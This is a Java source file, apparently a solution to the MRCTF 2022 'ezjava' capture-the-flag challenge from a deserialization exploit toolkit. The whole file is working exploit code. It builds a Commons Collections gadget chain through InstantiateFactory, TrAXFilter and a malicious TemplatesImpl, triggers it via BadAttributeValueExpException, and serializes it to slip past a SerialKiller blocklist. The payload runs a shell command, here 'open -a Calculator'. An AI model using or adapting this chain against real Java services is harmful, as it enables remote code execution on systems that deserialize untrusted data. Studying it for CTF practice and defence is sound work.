package xyz.eki.marshalexp.solution;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.util.HashMap;

public class MRCTFEzjava {
    public static void main(String[] args) throws Exception{
//        ConstantFactory constantFactory = new ConstantFactory("123123");
//        FactoryTransformer factoryTransformer = new FactoryTransformer(constantFactory);
//
//        System.out.println(factoryTransformer.transform(123));

        Transformer transformer = new FactoryTransformer(new InstantiateFactory(
                TrAXFilter.class,
                new Class[] { Templates.class },
                new Object[] {GTemplates.getEvilTemplates("open -a Calculator")} ));


        //transformer.transform("whatever");

        HashMap hashMap = GCC.getValue2TransformerInvoke(transformer);

        Object expObj = GBadAttributeValueExpException.deserialize2ToString(hashMap);

        byte[] exp = SerializeUtils.serialize(expObj);

        System.out.println("--------");

        SerializeUtils.serializeKillerDeserialize(exp,"filter/mrctf2022.ezjava.xml");
    }
}
